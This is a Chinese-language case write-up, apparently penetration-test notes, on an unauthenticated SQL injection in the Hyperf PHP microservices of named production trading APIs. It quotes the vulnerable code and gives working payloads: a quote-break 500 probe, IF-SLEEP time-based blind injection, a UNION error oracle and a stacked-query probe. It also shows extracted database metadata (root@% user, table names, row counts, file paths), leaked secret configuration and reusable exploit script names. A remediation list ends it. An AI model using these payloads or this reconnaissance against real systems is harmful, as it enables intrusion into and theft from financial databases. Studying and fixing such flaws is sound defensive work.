# 案例：LinkESOP (sy-esop) 未授权 SQLi → 生产交易库

## 靶标
- `http://api.esop.prod.linknet.ltd`（115.236.17.125，**API 只在 :80**，:443 已被 MaxKB 占据）
- `https://api.link-otc.prod.linktrade.pro`（LINKTRADE 生产，前置 whecloud CDN）
- 源码 7,131 个自研 PHP（Hyperf），10 个微服务共用同一套 fail-open 中间件

## 根因三连
1. `market-server/app/Middleware/AuthMiddleware.php`：`if (strlen($token) > 0) {…}` + 尾部无条件 `return $handler->handle($request)`
2. `market-server/app/Controller/v1/IPOController.php:~96`
   `$whereExp = 'user_id = ' . $userId . ' AND market = "' . $market . '" AND status not in (1,4)';`
   → `$this->IPORecordService->getIPORecord($whereExp, '`id`,`symbol`')`
3. `order-server/app/JsonRpc/OrderService.php:~31`：`IPORecordModel::query()->whereRaw($whereRaw)->selectRaw($field)->get()`

同族其它点：
- `open-admin/catch/setting/controller/Assessment.php:71` 后台 whereRaw 拼接（`$id` + 三个 result_* 文案）
- `active-server/app/Amqp/Consumer/ConsumerTrait.php:45` `call_user_func([$instance,$action[2]],...)`，`$action=explode('.',$data['event'])`
- 网关 `.env.prod`：`MICRO_SERVICE_SECRET=ADMIN_SECRET` 字面量；`.env.dev` 与 `.env.prod` 的 `JWT_ADMIN_SECRET` 同值

## 实证时间线
1. 无凭证 `GET /market.v1/IPO/IPOs?market=HKEX&status=1` → 200 `{"code":1,"msg":"操作成功","data":{"list":[]}}`
2. `market=HKEX"` → **500**（基线 200）
3. `OR IF(1=1,SLEEP(2),0) -- ` → 2.04s ；`IF(1=2,…)` → 0.03s
4. error oracle `IF((cond),(SELECT 1 UNION SELECT 2),0)` → 真 500 / 假 200，40ms
5. 并行外带（`xargs -P 8`）：
   - `database()` = `link_esop_order_service`
   - `version()` = `5.6.51`（EOL）
   - `current_user()` = `root@%`
   - 13 表：link_amend_record / link_asset_account / ling_asset_exchange_record / link_asset_record / link_asset_withdraw / link_broker_asset_account / link_dividend_record / link_interest_record / link_ipo_record / link_positions / link_splits_record / link_trade_pass / link_trade_record
   - `link_asset_account` 列：id,type,market,open_num,user_id,balance,ereeze_balance,freeze_bond,freeze_portfolios,currency,…
   - 行数：asset_account=165 / positions=825 / trade_record=390 / asset_withdraw=17
   - `@@secure_file_priv=/var/lib/mysql-files/`、`basedir=/usr/`、`datadir=/var/lib/mysql/`
6. 堆叠探针 `X"; SELECT SLEEP(3) -- ` → 500 ⇒ **只读边界确认**，未取得 shell

## 变量双重使用导致的“看不见”陷阱
`IPOController::IPOs()` 与 `detail()` 中，注入变量 `market/symbol/securityType` 同时进入参数化查询与拼接 SQL；脏值使参数化查询查空 → 提前 return / 列表为空。
⇒ 此类点**只能盲注**。不要因为“响应无变化”就判为不可注入——**用 500 差分与 IF-SLEEP 差分定真伪**。

## 脚本（本地 scratch，可复用）
- `lt_probe4.py` 未授权+500 差分 / `lt_probe6.py` 时间盲注 / `lt_errprobe.py` error oracle
- `lt_meta.py`、`lt_meta2.py` 并行外带器（`xargs -P 8`，元数据最小化）
- `lt_probe8.py` 堆叠能力判定（只读边界）
- `lt_sink_scan.py` 全库危险汇聚点扫描（Python 正则表：whereRaw/unserialize/eval/exec/file_*/call_user_func/SSRF，含 SQLI_RAW/SQLI_CONCAT/SQLI_QUERY 细分）

## 修复
1. AuthMiddleware 默认拒绝（10 个服务统一）；网关白名单逐接口登记
2. JsonRpc 禁传 SQL 片段 → 结构化条件数组（字段/操作符白名单）
3. 消除 whereRaw/selectRaw/orderBy(var) 拼接；列名白名单
4. `Assessment.php:71` 参数绑定；`$id` 整型
5. 密钥轮换（MICRO_SERVICE_SECRET / JWT_ADMIN_SECRET），删 DevelopMiddleware 硬编码，CORS 收紧
6. DB 账号 root@% → 按库最小权限；关闭 FILE；MySQL 5.6 → 8.0+
